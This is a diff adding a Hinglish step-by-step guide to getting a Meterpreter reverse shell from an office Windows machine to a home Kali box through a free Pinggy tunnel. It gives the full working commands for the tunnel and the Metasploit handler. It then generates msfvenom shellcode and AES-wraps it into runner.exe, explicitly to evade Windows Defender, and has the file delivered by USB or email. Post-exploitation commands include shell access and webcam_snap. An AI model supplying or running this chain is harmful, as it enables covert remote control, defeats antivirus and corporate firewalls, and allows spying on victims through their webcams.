@@ -1,0 +1,87 @@
+📄 Document: Windows to Linux Reverse Shell (Free Tunnel Method)
+Objective: Establish a connection between a Windows machine (Office Network) and a Kali Linux machine (Home Network) using a free TCP tunnel, bypassing the need for a VPS or paid services.
+
+📌 Phase 1: Network Traversal (Pinggy Tunnel Setup)
+Kyunki Windows Office network par hai aur Kali ghar ke WiFi par, humne Pinggy (Free SSH Tunnel) ka use kiya taaki Kali ka local port public internet par accessible ho sake.
+
+Kali Linux Terminal 1 kholiye.
+
+Yeh command run karein:
+
+
+ssh -p 443 -R0:localhost:5555 tcp@free.pinggy.io
+(Note: Yahan humne local port 5555 set kiya hai. Aap 4444 bhi use kar sakte hain, bas aage sab jagah wahi port use karna hai).
+
+Command chalane ke baad "password" mangega, wahan Enter dabayein.
+
+Aapko ek public address milega, jaise: tcp://xyz-abc.run.pinggy-free.link:37779
+
+Domain Note karein: xyz-abc.run.pinggy-free.link
+
+Port Note karein: 37779
+(Warning: Pinggy free tunnel 60 minutes mein expire ho jata hai).
+
+📌 Phase 2: Metasploit Listener Setup
+Kali mein ek naya terminal (Terminal 2) kholiye aur Metasploit start karein.
+
+Metasploit open karein:
+
+
+msfconsole -q
+Listener configure karein (Dhyan rahe payload mein underscore _ use karna hai):
+
+
+use exploit/multi/handler
+set payload windows/x64/meterpreter_reverse_tcp
+set LHOST 127.0.0.1
+set LPORT 5555
+set ReverseListenerBindAddress 127.0.0.1
+set ReverseListenerBindPort 5555
+set ExitOnSession false
+exploit -j
+(Agar port busy aaye, toh sudo lsof -i :5555 chala kar PID kill kar dein).
+
+📌 Phase 3: Payload Generation (Raw Shellcode)
+Windows Defender se bachne ke liye hum direct .exe nahi banayenge, balki Raw Shellcode banakar usko AES se encrypt karenge.
+
+Kali mein ek naya terminal (Terminal 3) kholiye:
+
+Raw payload generate karein (Pinggy ka domain aur port yahan daalein):
+
+
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=xyz-abc.run.pinggy-free.link LPORT=37779 -f raw -o payload.bin
+Ab is raw payload ko AES encryption ke sath compile karein (Shellcoderunner script ka use karke):
+
+
+python3 shellcoderunneraes.py payload.bin --aes MySecretPassword --compile
+Is command ke baad aapko ek nayi file milegi: runner.exe
+
+📌 Phase 4: Execution & Connection
+Is runner.exe file ko kisi tarah (USB, Email, etc. - ethically) Windows machine par le jaayein.
+
+Windows par runner.exe ko double-click karke run karein.
+
+Agar Office firewall ne port block nahi kiya hai, toh Metasploit (Terminal 2) mein turant session open ho jayega:
+
+
+[*] Meterpreter session 1 opened (127.0.0.1:5555 -> 127.0.0.1:xxxxx)
+📌 Phase 5: Post-Exploitation (Session ke andar)
+Session open hone ke baad, aap Windows machine ko control kar sakte hain.
+
+Session mein ghusne ke liye:
+
+sessions -i 1
+System ki information nikalne ke liye:
+
+
+sysinfo
+getuid
+Windows CMD shell access karne ke liye:
+
+
+shell
+whoami
+Webcam access (Agar available ho):
+
+
+webcam_snap
